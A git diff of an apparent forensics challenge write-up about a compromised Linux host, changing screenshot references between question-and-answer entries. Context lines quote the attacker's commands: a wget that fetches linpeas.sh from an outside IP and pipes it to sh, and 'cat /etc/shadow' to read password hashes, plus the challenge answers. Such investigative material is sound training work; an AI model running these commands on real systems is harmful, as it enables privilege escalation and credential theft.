@@ -66,7 +66,7 @@ wget -O - http://192.168.4.155:8000/linpeas.sh | sh
 
 LinPEAS is a well-known script that scans Linux systems for misconfigurations and privilege escalation opportunities.
 
-![](./screenshots/Screenshot_4.png)
+![](./screenshots/Screenshot_2.png)
 
 **A:** `LinPEAS`
 
@@ -92,11 +92,11 @@ aureport -p -if audit.log | grep evil
 
 This shows PID `829992`.
 
-![](./screenshots/Screenshot_5a.png)
-![](./screenshots/Screenshot_5b.png)
-![](./screenshots/Screenshot_5c.png)
-![](./screenshots/Screenshot_5d.png)
-![](./screenshots/Screenshot_5e.png)
+![](./screenshots/Screenshot_3.png)
+![](./screenshots/Screenshot_4.png)
+![](./screenshots/Screenshot_5.png)
+![](./screenshots/Screenshot_6.png)
+![](./screenshots/Screenshot_7.png)
 
 **A:** `evil, 829992`
 
@@ -114,7 +114,7 @@ This shows PID `829992`.
 
 **Q: What type of vulnerability is this?**
 
-![](./screenshots/Screenshot_7.png)
+![](./screenshots/Screenshot_8.png)
 
 **A:** `Heap-Based Buffer Overflow`
 
@@ -125,6 +125,8 @@ This shows PID `829992`.
 **Q: What file was exfiltrated once root was gained?**
 
 After gaining root access, the attacker read the system's password file with `cat /etc/shadow`.
+
+![](./screenshots/Screenshot_9.png)
 
 **A:** `/etc/shadow`
 
